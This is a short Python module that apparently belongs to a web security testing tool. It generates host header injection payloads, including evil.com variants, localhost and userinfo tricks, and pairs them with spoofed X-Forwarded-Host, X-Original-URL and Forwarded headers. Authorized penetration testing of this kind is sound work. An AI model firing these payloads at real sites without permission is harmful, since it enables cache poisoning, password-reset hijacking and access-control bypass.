"""
Host Header Injection Attacks
"""

from typing import List

class HostHeaderAttacks:
    @staticmethod
    def get_payloads(original_host: str) -> List[str]:
        """Generate host header injection payloads"""
        return [
            "evil.com",
            "localhost",
            "127.0.0.1",
            f"{original_host}.evil.com",
            f"evil.com#{original_host}",
            f"{original_host}@evil.com",
            "0.0.0.0",
            "[::1]",
            f"{original_host}:@evil.com"
        ]
    
    @staticmethod
    def get_additional_headers(payload: str) -> dict:
        """Return additional headers for host header attacks"""
        return {
            "X-Forwarded-Host": payload,
            "X-Forwarded-Server": payload,
            "X-Host": payload,
            "X-Original-URL": f"http://{payload}",
            "Forwarded": f"host={payload}"
        }
